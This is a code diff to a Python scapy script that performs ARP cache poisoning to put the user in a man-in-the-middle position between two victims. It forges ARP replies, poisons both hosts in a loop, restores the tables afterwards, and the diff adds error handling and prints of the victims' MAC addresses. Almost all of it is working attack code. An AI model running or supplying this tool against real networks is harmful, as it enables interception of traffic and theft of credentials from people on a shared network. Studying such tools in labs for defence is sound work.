@@ -5,24 +5,26 @@ from time import sleep
 
 def poison(victim_ip, spoof_ip, victim_mac='', interface=''):
     '''Change mac address in arp table'''
+    try:
         # Only get target mac if victim mac is not specified
-    if victim_mac == '':
-        # Get victim host ip address using previously created function
-        print("really happening?")
-        victim_mac = get_target_mac(victim_ip, interface)
+        if victim_mac == '':
+            # Get victim host ip address using previously created function
+            victim_mac = get_target_mac(victim_ip, interface)
+            
+        # Set interface to the default if not specified
+        if interface == '':
+            interface = conf.iface
+
+        # Create the ARP packet, scapy will add your MAC address for hwsrc
+        # op=2 means that ARP is going to send answer 
+        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
         
-    # Set interface to the default if not specified
-    if iface =='':
-        iface = conf.iface
+        # print(packet) #debugging
 
-    # Create the ARP packet, scapy will add your MAC address for hwsrc
-    # op=2 means that ARP is going to send answer 
-    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
-    
-    # print(packet) #debugging
-
-    # Send the ARP packet without output
-    send(packet, verbose=False)
+        # Send the ARP packet without output
+        send(packet, verbose=False)
+    except:
+        print('Victim not found')
 
 
 def restore_arp(victim_ip, spoof_ip, interface=''):
@@ -53,8 +55,12 @@ def mitm_arp(victim_1_ip, victim_2_ip, interface):
         print(f'finding victim mac addresses on {interface}')
         victim_1_mac = get_target_mac(victim_1_ip, interface)
         victim_2_mac = get_target_mac(victim_2_ip, interface)
+        print(f'The mac address of the first victim: {victim_1_mac}')
+        print(f'The mac address of the second victim: {victim_2_mac}')
 
         while True:
+            print(f'The mac address of the first victim: {victim_1_mac}')
+            print(f'The mac address of the second victim: {victim_2_mac}')
             poison(victim_1_ip, victim_2_ip, victim_1_mac, interface)
             poison(victim_2_ip, victim_1_ip, victim_2_mac, interface)
             sleep(2)
@@ -63,3 +69,5 @@ def mitm_arp(victim_1_ip, victim_2_ip, interface):
         restore_arp(victim_1_ip, victim_2_ip, interface)
         restore_arp(victim_2_ip, victim_1_ip, interface)
         print('\nARP table restored.')
+    except:
+        print('Victim not found')
